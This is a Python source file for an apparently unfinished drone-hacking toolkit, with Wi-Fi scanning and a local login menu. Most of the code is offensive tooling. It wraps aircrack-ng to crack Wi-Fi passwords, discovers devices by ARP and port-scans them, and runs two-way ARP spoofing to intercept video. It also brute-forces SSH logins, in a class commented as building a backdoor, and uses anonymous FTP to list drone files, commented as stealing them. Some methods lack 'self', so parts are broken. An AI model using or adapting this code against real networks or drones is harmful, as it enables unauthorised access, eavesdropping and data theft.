import subprocess
import re
import socket
import os
import hashlib
import signal
import math
import sys
from scapy.all import *
import paramiko
from scapy.all import ARP, Ether, srp
import ipaddress
from datetime import datetime
from ftplib import FTP
import json
from concurrent.futures import ThreadPoolExecutor


# Authentication
class UserManagement:
    def __init__(self):
        self.users = self.load_users()

    def hash_password(self, password):
        return hashlib.sha256(password.encode()).hexdigest()

    def load_users(self):
        try:
            with open("users.json", "r") as file:
                return json.load(file)
        except FileNotFoundError:
            return {}
        except json.JSONDecodeError:
            print("Error: Invalid JSON data in users.json file.")
            return {}

    def save_users(self):
        with open("users.json", "w") as file:
            json.dump(self.users, file)

    def login(self):
        username = input("Enter username: ")
        password = input("Enter password: ")
        hashed_password = self.hash_password(password)
        if username in self.users and self.users[username]["password"] == hashed_password:
            print("Login successful!")
            return True
        else:
            print("Invalid username or password.")
            return False

    def create_user(self):
        username = input("Enter new username: ")
        if username in self.users:
            print("Username already exists.")
            return
        password = input("Enter new password: ")
        hashed_password = self.hash_password(password)
        self.users[username] = {"password": hashed_password}
        self.save_users()
        print("User created successfully.")

#  Select Interface 
class InterfaceManager:
    def __init__(self):
        pass

    def get_available_interfaces(self):
        return get_if_list()

    def get_user_input(self):
        # Display available interfaces
        print("Available interfaces:")
        interfaces = self.get_available_interfaces()
        for i, iface in enumerate(interfaces):
            print(f"{i + 1}. {iface}")

        # Prompt user to choose an interface
        interface_choice = input("Choose the interface (enter the number): ")
        try:
            interface_index = int(interface_choice) - 1
            interface = interfaces[interface_index]
            return interface
        except (ValueError, IndexError):
            print("Invalid choice. Exiting.")
            sys.exit(1)

# Scan WiFi Networks 
class WiFi_toolkit:
    def __init__(self, interface):
        self.interface = interface

    def scan(self):
        """Scan for available Wi-Fi networks and retrieve detailed information using iwlist."""
        output = subprocess.check_output(f"iwlist {self.interface} scan", shell=True).decode()

        networks = []
        current_network = {}

        for line in output.split("\n"):
            if "Cell" in line:
                if current_network:
                    networks.append(current_network)
                current_network = {"ESSID": None, "Channel": None, "Frequency": None, "Quality": None}
            elif "ESSID:" in line:
                current_network["ESSID"] = line.split(":")[1].strip().strip('"')
            elif "Channel:" in line:
                current_network["Channel"] = line.split(":")[1]
            elif "Frequency:" in line:
                frequency_match = re.search(r"(\d+\.\d+) GHz", line)
                if frequency_match:
                    current_network["Frequency"] = frequency_match.group(1)
            elif "Quality=" in line:
                match = re.search(r"(\d+/\d+)", line)
                if match:
                    current_network["Quality"] = match.group(1)

        if current_network: 
            networks.append(current_network)

        return networks

    def display(self):
        networks = self.scan()
        print("{:<20} {:<10} {:<15} {:<15}".format("ESSID", "Channel", "Frequency", "Quality"))
        for network in networks:
            essid = network["ESSID"] if network["ESSID"] is not None else ""
            channel = network["Channel"] if network["Channel"] is not None else ""
            frequency = network["Frequency"] if network["Frequency"] is not None else ""
            quality = network["Quality"] if network["Quality"] is not None else ""
            print("{:<20} {:<10} {:<15} {:<15}".format(essid, channel, frequency, quality))


    def select_network(self):
        networks = self.scan()
        print("{:<5} {:<20} {:<10} {:<15} {:<15}".format("Index", "ESSID", "Channel", "Frequency", "Quality"))
        for i, network in enumerate(networks):
            essid = network["ESSID"] if network["ESSID"] is not None else ""
            channel = network["Channel"] if network["Channel"] is not None else ""
            frequency = network["Frequency"] if network["Frequency"] is not None else ""
            quality = network["Quality"] if network["Quality"] is not None else ""
            print("{:<5} {:<20} {:<10} {:<15} {:<15}".format(i, essid, channel, frequency, quality))

        selected_index = input("Enter the index of the WiFi network you want to connect to: ")
        try:
            selected_index = int(selected_index)
            if 0 <= selected_index < len(networks):
                selected_network = networks[selected_index]
                essid = selected_network["ESSID"]
                print(f"You've selected '{essid}'")
                return essid
            else:
                print("Invalid index. Please enter a valid index.")
        except ValueError:
            print("Invalid input. Please enter a number.")

    def crack_password(selected_network, wordlist_path):
        essid = selected_network.get("ESSID")
        if essid is None:
            print("Error: Selected network does not have an ESSID.")
            return

        # Run aircrack-ng with the specified wordlist to crack the password
        try:
            result = subprocess.run(["aircrack-ng", "-e", essid, "-w", wordlist_path], capture_output=True, text=True)
            output = result.stdout
            # Extract the password if found
            password = None
            for line in output.split('\n'):
                if 'KEY FOUND' in line:
                    password = line.split(':')[1].strip()
                    break
            if password:
                print(f"Password for network '{essid}': {password}")
            else:
                print(f"Password for network '{essid}' not found in the wordlist.")
        except FileNotFoundError:
            print("Error: Aircrack-ng not found. Please make sure it is installed and in your PATH.")
    
    # Connect to WiFi Network
    def connect_to_wifi(wifi_name, password):
        command = f'nmcli device wifi connect "{wifi_name}" password "{password}"'
        try:
            subprocess.run(command, shell=True, check=True)
            print(f"Connected to {wifi_name} successfully.")
        except subprocess.CalledProcessError:
            print(f"Failed to connect to {wifi_name}.")

    def extract_subnet(interface):
        try:
            # Get the IP address and netmask for the interface using the 'ip addr' command
            output = subprocess.check_output(["ip", "addr", "show", interface], text=True)
        except subprocess.CalledProcessError as e:
            print(f"Error: Unable to execute 'ip addr show {interface}' command.", e)
            return None

        cidr = None
        lines = output.splitlines() 
        for line in lines:
            if "inet " in line:
                parts = line.split()
                ip_address = parts[1].split("/")[0]
                cidr = parts[1]
                break

        if cidr is None:
            print(f"Error: Unable to extract CIDR notation for interface {interface}.")
            return None

        return cidr

    def get_devices(cidr):
        """Get a list of devices connected to the local network using ARP requests."""
        # Create an ARP request packet
        local_subnet = cidr  # Replace with your actual local subnet

        arp = ARP(pdst=local_subnet)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        # Send the packet and capture the response
        result = srp(packet, timeout=3, verbose=0)[0]

        # Extract the MAC and IP addresses from the response
        devices = []
        for res in result:
            device_info = {"mac": res[1].hwsrc, "ip": res[1].psrc, "name": WiFi_toolkit.get_device_name(res[1].psrc)}
            devices.append(device_info)
        return devices
    
    def get_device_name(ip_address):
        try:
            # Attempt to resolve the device name using NetBIOS queries
            hostname, _, _ = socket.gethostbyaddr(ip_address)
            return hostname.split(".")[0]  # Use only the hostname part
        except (socket.herror, socket.gaierror):
            return ""  # Return an empty string if unable to resolve the device name
        
    def select_target_device(cidr):
        devices = WiFi_toolkit.get_devices(cidr)
        
        print("Available devices:")
        for i, device in enumerate(devices):
            print(f"{i + 1}. {device['name']} ({device['ip']})")
        
        while True:
            try:
                choice = int(input("Enter the index of the device you want to select as target: "))
                if 1 <= choice <= len(devices):
                    selected_device = devices[choice - 1]
                    return selected_device['ip']
                else:
                    print("Invalid choice. Please enter a valid index.")
            except ValueError:
                print("Invalid input. Please enter a number.")

    def scan_ports(host):
        def scan_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)  # Adjust timeout as needed
                    s.connect((host, port))
                    service = socket.getservbyport(port)
                    print(f"Port {port} open: {service}")
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s_version:
                            s_version.settimeout(1)  # Adjust timeout as needed
                            s_version.connect((host, port))
                            s_version.sendall(b"GET / HTTP/1.0\r\n\r\n")
                            banner = s_version.recv(1024).decode("utf-8")
                            print(f"Version: {banner.strip()}")
                    except socket.error:
                        pass
            except socket.error:
                pass

        print(f"Scanning host: {host}")
        with ThreadPoolExecutor(max_workers=50) as executor:
            for port in range(1, 1001):  # Scan common ports
                executor.submit(scan_port, port)

                
# Get Drone Manufacturer
class DroneSelector:
    def __init__(self):
        self.manufacturers = ["DJI","Parrot","Yuneec"]

    def add_manufacturer(self, name):
        self.manufacturers.append(name)

    def select_manufacturer(self):
        if not self.manufacturers:
            print("No manufacturers available.")
            return None
        print("Available Manufacturers:")
        for index, manufacturer in enumerate(self.manufacturers, start=1):
            print(f"{index}. {manufacturer}")
        choice = input("Enter the number corresponding to the manufacturer: ")
        try:
            choice_index = int(choice) - 1
            if 0 <= choice_index < len(self.manufacturers):
                print(f"You selected {self.manufacturers[choice_index]} as the manufacturer.")
                return self.manufacturers[choice_index]
            else:
                print("Invalid choice. Please select a valid manufacturer.")
                return None
        except ValueError:
            print("Invalid input. Please enter a number.")
            return None


                
# ARP Spoofing & Vidieo Intercepting
class ARPSpoofer:
    def __init__(self, target_ip, spoof_ip, interface):
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface
        self.processes = []

    def start(self):
        # Start ARP spoofing from target to spoof IP
        command_target = ["arpspoof", "-i", self.interface, "-t", self.target_ip, self.spoof_ip]
        process_target = subprocess.Popen(command_target)

        # Start ARP spoofing from spoof IP to target
        command_spoof = ["arpspoof", "-i", self.interface, "-t", self.spoof_ip, self.target_ip]
        process_spoof = subprocess.Popen(command_spoof)

        self.processes.append(process_target)
        self.processes.append(process_spoof)

        print("[+] ARP spoofing started...")

    def stop(self):
        # Stop ARP spoofing processes
        for process in self.processes:
            process.terminate()
        print("[+] ARP spoofing stopped.")

# Vieo Intercepting

# SSH Connection and Building aa backdoor
class SSHBruteForce:
    def __init__(self, target_host, username_list, password_list, port=22):
        self.target_host = target_host
        self.port = port
        self.username_list = username_list
        self.password_list = password_list

    def ssh_connect(self, username, password):
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh_client.connect(self.target_host, port=self.port, username=username, password=password, timeout=5)
            print(f"[+] Successfully logged in with {username}:{password}")
            ssh_client.close()
            return True
        except (paramiko.AuthenticationException, socket.error) as e:
            print(f"[-] Failed to login with {username}:{password}: {e}")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False

    def brute_force(self):
        for username in self.username_list:
            for password in self.password_list:
                if self.ssh_connect(username, password):
                    return True
        return False

# FTP Connection and stealing files

class DroneFTPConnector:
    def __init__(self, drone_ip):
        self.drone_ip = drone_ip
        self.ftp = FTP()

    def connect(self):
        try:
            self.ftp.connect(self.drone_ip)
            self.ftp.login()  # Null session login (anonymous)
            print("Connected to FTP server successfully.")
        except Exception as e:
            print(f"Failed to connect to FTP server: {e}")

    def list_files(self):
        try:
            files = self.ftp.nlst()
            print("Files in the current directory:")
            for file in files:
                print(file)
        except Exception as e:
            print(f"Failed to list files: {e}")

    def disconnect(self):
        try:
            self.ftp.quit()
            print("Disconnected from FTP server.")
        except Exception as e:
            print(f"Error while disconnecting: {e}")

# Turnon Camera 

# Instruction Inejection

# main